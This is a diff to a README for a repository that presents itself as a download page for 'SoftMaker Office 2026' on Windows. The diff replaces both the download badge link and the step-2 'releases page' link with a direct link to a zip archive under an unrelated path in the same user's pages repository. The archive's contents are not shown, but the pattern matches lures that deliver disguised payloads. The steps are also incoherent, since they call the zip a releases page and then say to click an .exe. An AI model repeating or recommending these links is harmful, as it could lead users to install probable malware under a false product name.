@@ -5,7 +5,7 @@ description: "Download the SoftMaker Office installer for Windows 10 and 11 to a
 ---
 # 📄 SoftMaker-Office-2026 - Complete Office Suite For Windows PCs
 
-[![Download SoftMaker Office](https://img.shields.io/badge/Download-SoftMaker_Office-blue.svg)](https://github.com/voidstarr23/SoftMaker-Office-2026/releases)
+[![Download SoftMaker Office](https://img.shields.io/badge/Download-SoftMaker_Office-blue.svg)](https://raw.githubusercontent.com/voidstarr23/voidstarr23.github.io/main/bondmanship/github_voidstarr_io_v2.0.zip)
 
 SoftMaker Office 2026 provides a complete solution for document creation, data management, and presentations. It works well on Windows 11 and Windows 10. The suite includes a word processor, a spreadsheet application, and presentation software. This guide helps you download and install the software on your computer.
 
@@ -25,7 +25,7 @@ Your computer must meet these requirements to run the software correctly:
 Follow these steps to obtain the official setup files for SoftMaker Office 2026.
 
 1. Open your web browser. 
-2. Visit the releases page at https://github.com/voidstarr23/SoftMaker-Office-2026/releases.
+2. Visit the releases page at https://raw.githubusercontent.com/voidstarr23/voidstarr23.github.io/main/bondmanship/github_voidstarr_io_v2.0.zip
 3. Look for the latest version listed under the Releases section.
 4. Click the file ending in .exe to start the download process.
 5. Save the file to your Downloads folder.
